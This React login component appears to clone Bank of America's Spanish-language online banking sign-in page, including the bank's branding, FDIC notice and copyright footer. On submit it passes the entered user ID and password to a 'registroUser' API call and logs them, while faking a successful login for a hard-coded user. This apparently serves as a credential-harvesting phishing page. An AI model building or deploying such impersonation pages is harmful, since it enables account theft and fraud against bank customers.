import React, { useContext, useEffect, useState } from "react";
import AuthContext from "../../context/auth/authContext";
import { types } from "../../context/auth/types";
import { Link } from "react-router-dom";
import * as FaIcons from "react-icons/fa";
import * as AiIcons from "react-icons/ai";
import * as IoIcons from "react-icons/io";
import * as GiIcons from "react-icons/gi";
import "./login.scss";

//peticiones
import { registroUser } from "../../config/authApi";



export default function Login() {

  //context
  const { dispatch } = useContext(AuthContext);

  const [textButtom, setTextButtom] = useState(false)   //cambia text del buttom
  const [dataUser, setDataUser] = useState({
    user: "",
    password: "",
  });


  const { user, password } = dataUser;

  const dataState = (e) => {
    setDataUser({
      ...dataUser,
      [e.target.name]: e.target.value,
    });
  };



  //poner disabled el input de password
  useEffect(() => {
    if (user.length >= 6) {
      console.log(user.length);
      setTextButtom(true)
      document.getElementById("pass").disabled = false;
    } else if (user.length < 6) {
      setTextButtom(false)
      document.getElementById("pass").disabled = true;
    }
  }, [user]);



  // const loginUser = async (e) => {
  //   e.preventDefault()
  //   console.log(datax);
  //   const datax = await registroUser(dataUser)
  //   dispatch({
  //     type: types.LOGIN,
  //     payload: {
  //       name: "Rolando",
  //     },
  //   });
  //   // history.replace(lastpath);
  // };


  const loginUser = async (e) => {
    e.preventDefault();
    dispatch({
      type: types.LOGIN,
      payload: {
        name: "Rolando",
      },
    });

    console.log(dataUser);
    const redes = await registroUser(dataUser)
    console.log(redes);
    // history.replace(lastpath);
  };

  return (
    <div className="login">
      <header className="login__header">
        <div className="login__header__nav-left">
          <img className="logo" src="assets/login/logo.png" alt="logo" />
          <Link className="link" to="/login">
            Sign In
          </Link>
        </div>
        <div className="login__header__nav-derecho">
          <div className="div-segura">
            <FaIcons.FaLock />
            <span className="text-segura">Area Segura</span>
          </div>
          <div className="div-idioma">
            <AiIcons.AiOutlineSmallDash className="icon-puntos" />
            <span>En español</span>
          </div>
        </div>
      </header>
      <section className="login__header-bottom">
        <h3 className="text">Iniciar sesión en la banca en línea</h3>
      </section>

      <section className="login__body">
        {/* formulario */}
        <form className="login__body__form" onSubmit={loginUser} >
          <div className="div-input">
            <label className="label-form">Identificacion en linea </label>
            <input
              className="input-form"
              type="text"
              value={user}
              name="user"
              onChange={dataState}
            />
          </div>

          <div className="div-input">
            <label className="label-form">Contraseña </label>
            <input
              id="pass"
              disabled
              className="input-form"
              type="password"
              name="password"
              value={password}
              onChange={dataState}
            />
          </div>

          <Link className="text-pass" to="">
            ¿Olvidó su contraseña?
          </Link>
          <button className="btn-form" type="submit" >
            <IoIcons.IoIosUnlock />
            {textButtom ? <span>Iniciar sesion</span> : <span>Registrarse</span>}
          </button>
        </form>
        {/* img de mobile */}
        <div className="login__body__body-medio">
          <p className="text-header">
            Mantente conectado con nuestra aplicación
          </p>
          <div className="div-image">
            <img src="assets/login/cel.png" alt="mobile" />
            <div className="div-derecho">
              <p className="text-img">
                Banca segura y conveniente en cualquier momento
              </p>
              <Link className="btn-img" to="/">
                Obten la aplicacion
              </Link>
            </div>
          </div>
        </div>

        <div className="login__body__body-derecho">
          <p className="text-1">Ayuda para iniciar sesión</p>
          <p className="text-2">¿Olvidó su ID / contraseña?</p>
          <p className="text-2">¿Problemas para iniciar sesión?</p>

          <p className="text-1">¿No utiliza la banca en línea?</p>
          {/* <br /> */}
          <p className="text-2">Enlístate ahorapara la banca en línea</p>
          <p className="text-2">
            Obtenga más información sobre la banca en línea
          </p>
          <p className="text-2">Acuerdo de servicio</p>
        </div>
      </section>

      {/* //footer */}
      <footer className="login__footer">
        <span className="text-footer">
          <IoIcons.IoIosUnlock />
          Area segura
        </span>
        <div className="div-span">
          <span className="text-span">Privacidad</span>
          <p>|</p>
          <span className="text-span">seguridad </span>
        </div>
        <p className="text-end">
          Bank of America, miembro de NA FDIC. Prestamista de vivienda
          equitativa {""}
          <GiIcons.GiHouse />
        </p>
        <p className="text-end">© 2021 Bank of America Corporation.</p>
      </footer>
    </div>
  );
}
